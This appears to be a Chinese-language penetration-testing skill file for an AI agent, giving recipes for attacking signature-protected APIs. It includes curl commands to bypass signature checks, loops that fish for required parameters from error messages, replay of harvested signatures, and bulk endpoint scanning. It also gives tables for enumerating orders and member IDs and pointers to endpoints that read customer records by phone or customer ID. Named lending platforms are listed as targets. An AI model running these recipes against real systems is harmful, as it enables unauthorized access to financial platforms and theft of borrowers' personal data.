# 预言机配方集(签名闸 API)

## A. 判闸 + 绕过 一行流
```bash
B=/tmp/b; H='https://<host>'
# 存在性绕过(JSON 与 multipart 两种入口都要试)
curl -sk -X POST "$H/api/app/xxx" -H 'Content-Type: application/json;charset=UTF-8' -d '{"sign":"1"}' -o $B -w '%{http_code} '; cat $B
curl -sk -X POST "$H/api/app/xxx" -F 'sign=1' -F 'file=@/tmp/a.png' -o $B -w '%{http_code} '; cat $B
```
判据:`101020 未获得签名` → 绕过成功进业务层;`101010 验签失败` → 该面必须真值,换面。

## B. 逐参喂参(参数预言机)
```bash
P=/api/v1/confirm/pre-sign
for q in '' '?timestamp=1790000000000' '?timestamp=1790000000000&nonce=1' '?timestamp=1790000000000&nonce=1&signature=1'; do
  printf '%-70s ' "$q"; curl -sk --path-as-is -o /tmp/b -w '%{http_code}|%{size_download} ' "$H$P$q"; head -c 200 /tmp/b; echo
done
```
输出形如 `缺少参数，名称：nonce，类型：String` → 补上 → 下一个。全部补齐后若得 `400000 链接已失效` 说明该端点的签名是**路径绑定**的外部签发,转第 C 节。

## C. 签名预言机 → 签名外发链
```
GET /api/<x>/re-route                     → {"url":"…/render/order/undefined?timestamp=<ms>&nonce=<hex>&signature=<hex>"}
       ↓ 换 ?orderNo=<真实ID> / ?mid=<ID>,签名值随之改变 ⇒ 签名覆盖请求参数
GET /render/order/<真实ID>?<三元组>        → 302 Location: /<base-v2>/loan-process?orderNo=<ID>&timestamp&nonce&signature
       ↓ 302 的 base 是新前端(此前未见过)
拉 /<base-v2>/js/app.*.js                 → route 表 + API 常量对象(数百条路径)
       ↓ 用同族未被签名的 API 拿会话
```
要点:签名**路径绑定**,不可跨端点复用;nonce 常一次性;取到签名后原样请求,不要重组参数顺序(部分实现把参数顺序也纳入签名)。

## D. 批量扫 → 落盘 → 投影(别用 head 截)
```bash
# 扫描脚本内:命中统一写成 "METHOD path code body" 存 /root/t/hits.txt
wc -l /root/t/hits.txt
grep -v 'Could not resolve view' /root/t/hits.txt | cut -c1-165   # 真数据/真接口(400 缺参、上游宕、200 数据)
grep -c 'Could not resolve view' /root/t/hits.txt                # 控制器已执行但返视图 = 也是命中
```
- 400 文案分类:`Required <type> parameter 'x' is not present` = 参数预言机;`上游宕/failed and no fallback` = 控制器已执行;`415 Unsupported Media Type` = 端点要 multipart,别判死。
- 命中后**补参复测**:同一端点从「报视图错」变为「静默/切换错误」= 校验通过 = SQL 已执行,数据层可用。
- 命名族 `selectByExample` / `selectByMobileCount` / `queryByCustId` / `queryLatestRecordByCustId` / `getXxxByCustId` 且必填 `?phone=` / `?custId=` / `?mid=` 的端点 = **直读数据表**的最好入口,优先喂真值。

## E. Cookie 里的挑战值
```bash
curl -sk -D /tmp/h -o /tmp/b "$H/api/validations/image-captcha"
grep -i 'set-cookie' /tmp/h        # X-nonce=<uuid> + X-nonce.sig=<HMAC> → 原值回填为请求的 requestNo/nonce
```
验证码识别用放大 6-10x 读图(报错文案自校验),不要写 OCR。

## F. 存在性预言机速查
| 端点形态 | 报错 | 含义 |
|---|---|---|
| `GET orders?orderNo=X` | `进件不存在` | 订单/进件不存在,可枚举 |
| `POST sj/verify {userId}` | `会员N不存在`(带千分位=真读值) | 会员 ID 不存在 |
| `POST getcontract?order-no=X` | 先要 `type`(枚举) | 补枚举字面量再判 |
| `POST getXxxByCustId {custId}` | 500 视图错 | 控制器已执行 |
| `GET bind-card/{id}/acc-info` | 200 `{}` | 免鉴权空体 = 真接口 |

## G. 具体目标族
ARES/CZ 信贷平台(极融/cftcredit/geerong)的端点级细节见 `ares-loan-platform-pentest`(用户自有技能,需 `hermes curator adopt` 后才能由 curator 维护)。
